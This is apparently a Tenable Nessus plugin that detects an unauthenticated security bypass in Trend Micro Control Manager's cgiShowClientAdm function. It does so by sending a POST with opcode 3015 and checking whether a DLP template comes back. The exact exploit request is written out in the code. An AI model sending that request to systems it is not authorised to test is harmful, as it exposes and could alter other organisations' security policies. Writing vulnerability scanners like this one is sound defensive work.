#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(99730);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2017/04/28 18:13:58 $");

  script_osvdb_id(155059);
  script_bugtraq_id(97541);
  script_xref(name:"ZDI", value:"ZDI-17-244");

  script_name(english:"Trend Micro Control Manager cgiShowClientAdm Security Bypass");
  script_summary(english:"Attempts to access cgiShowClientAdm functionality to download a DLP template.");

  script_set_attribute(attribute:"synopsis", value:
"A CGI application running on the remote host is affected by a security
bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Trend Micro Control Manager running on the remote host
is affected by a security bypass vulnerability when processing calls
to the cgiShowClientAdm() web function due to a failure to provide
authentication for the functionality that exposes, modifies, or
deletes DLP templates involved in filtering. An unauthenticated,
remote attacker can exploit this issue to modify the security posture
of the underlying product.

Note that this plugin attempts to download a DLP template. Also,
Trend Micro Control Manager is reportedly affected by additional
vulnerabilities; however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"https://success.trendmicro.com/solution/1116863");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-17-244/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Trend Micro Control Manager version 6, build 3506.

Note that version 6.0 build 3506 requires version 6.0 SP3 Patch 2 as a
prerequisite.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/04/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/04/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:trend_micro:control_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("trendmicro_control_manager_detect_unauth.nbin");
  script_require_keys("installed_sw/Trend Micro Control Manager");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Trend Micro Control Manager";

# Exit if TMCM is not detected on the target
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:443, php:TRUE);

# Exit if TMCM is not detected on the port
install = get_single_install(
  app_name : app,
  port     : port
);

url = "/controlManager/cgi-bin/cgiShowClientAdm.exe";

http_set_read_timeout(15);

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : url,
  data   : "id=3015",
  content_type: 'application/x-www-form-urlencoded',
  exit_on_fail : TRUE
);

if (res[0] =~ "^HTTP/[0-9]\.[0-9] 502")
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:install['path'], port:port));
}
else if (res[0] =~ "^HTTP/[0-9]\.[0-9] 200")
{
  if (res[2] =~ "SAPolicy\s+template_version")
  {
    matches = pregmatch(string:res[1], pattern:'filename\\s*=\\s*"([^"]+)"');
    if(matches) file = matches[1];
    else        file = "DlpTemplatExport.dat";

    req = http_last_sent_request();
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      file        : file,
      request     : make_list(req),
      output      : chomp(res[2]),
      attach_type : 'text/plain'
    );
  }
  else
  {
    audit(AUDIT_RESP_BAD, port, "an opcode 3015 request. Unexpected response body");
  }
}
else
{
  audit(AUDIT_RESP_BAD, port, "an opcode 3015 request. Unexpected response status: " + chomp(res[0]));
}

